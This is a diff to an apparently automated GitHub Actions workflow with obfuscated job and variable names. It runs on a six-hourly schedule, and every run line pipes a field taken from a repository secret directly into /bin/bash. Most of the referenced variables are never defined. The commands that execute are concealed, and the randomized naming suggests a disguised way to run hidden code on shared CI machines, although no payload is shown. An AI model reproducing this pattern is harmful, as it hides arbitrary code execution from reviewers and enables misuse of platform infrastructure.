@@ -2,7 +2,7 @@ name: tangyangzhong1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 4/6 * * *'
+    - cron: '37 0/6 * * *'
 
 jobs:
   build:
@@ -12,17 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: tangyangzhong1987
         env:
-          xd645: ${{ secrets.xd645 }}
+          vq42865: ${{ secrets.vq42865 }}
         run: |
-          echo $xd645 | jq -r .cwt10 | /bin/bash
-          echo $dbn2943 | jq -r .tnkt82 | /bin/bash
-          echo $b07023 | jq -r .yltn8598 | /bin/bash
-          echo $o26 | jq -r .idzci0424 | /bin/bash
-          echo $kkp178 | jq -r .nkg43887 | /bin/bash
-          echo $o1132 | jq -r .hh5400 | /bin/bash
-          echo $e3773 | jq -r .k2196 | /bin/bash
-          echo $fax28750 | jq -r .qeqjj3215 | /bin/bash
-          echo $vgx55 | jq -r .khhv959 | /bin/bash
-          echo $neuv46478 | jq -r .og578 | /bin/bash
-          echo $hccs0561 | jq -r .i48 | /bin/bash
+          echo $vq42865 | jq -r .xn775 | /bin/bash
+          echo $b503 | jq -r .merbe380 | /bin/bash
+          echo $dadmq5 | jq -r .hper8 | /bin/bash
+          echo $q3 | jq -r .yc78 | /bin/bash
+          echo $kazk572 | jq -r .jddcn8 | /bin/bash
+          echo $spaii6 | jq -r .f8965 | /bin/bash
+          echo $vedcz35173 | jq -r .csnci67790 | /bin/bash
 
